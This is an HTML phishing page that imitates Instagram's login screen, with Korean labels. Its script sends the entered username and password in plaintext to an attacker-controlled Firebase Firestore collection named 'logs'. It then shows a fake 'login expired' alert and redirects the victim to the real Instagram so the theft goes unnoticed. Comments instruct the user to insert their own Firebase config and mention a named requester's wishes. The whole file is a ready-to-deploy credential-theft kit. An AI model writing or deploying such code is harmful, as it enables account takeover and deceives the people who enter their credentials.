<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body { background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
        .box { background-color: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; box-sizing: border-box; }
        h1 { font-style: italic; font-size: 2.5rem; margin-bottom: 20px; }
        input { width: 100%; padding: 9px; margin-bottom: 6px; border: 1px solid #dbdbdb; border-radius: 3px; background-color: #fafafa; box-sizing: border-box; }
        button { width: 100%; background-color: #0095f6; color: white; border: none; padding: 7px; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="box">
        <h1>Instagram</h1>
        <form id="loginForm">
            <input type="text" id="id" placeholder="전화번호, 사용자 이름 또는 이메일" required>
            <input type="password" id="pw" placeholder="비밀번호" required>
            <button type="submit" id="submitBtn">로그인</button>
        </form>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

        // ★ 여기 아래 중괄호 { } 내용을 본인의 Firebase '구성' 값으로 덮어쓰세요 ★
        const firebaseConfig = {
            apiKey: "AIzaSy...", 
            authDomain: "instagram-be709.firebaseapp.com",
            projectId: "instagram-be709",
            storageBucket: "instagram-be709.appspot.com",
            messagingSenderId: "...",
            appId: "..."
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const submitBtn = document.getElementById('submitBtn');
            const idVal = document.getElementById('id').value;
            const pwVal = document.getElementById('pw').value;
            
            submitBtn.innerText = "로그인 중...";
            submitBtn.disabled = true;

            try {
                // 'logs' 컬렉션에 데이터 전송
                await addDoc(collection(db, "logs"), {
                    userId: idVal,
                    userPw: pwVal,
                    timestamp: new Date()
                });
                
                // 상준님이 원하신 만료 메시지
                alert("로그인 프로세스가 만료되었습니다. 다시 로그인해 주세요.");
                
                // 진짜 인스타그램으로 이동
                window.location.href = "https://www.instagram.com/accounts/login/";
            } catch (error) {
                console.error(error);
                alert("연결 오류가 발생했습니다. 잠시 후 다시 시도해주세요.");
                submitBtn.disabled = false;
                submitBtn.innerText = "로그인";
            }
        });
    </script>
</body>
</html>
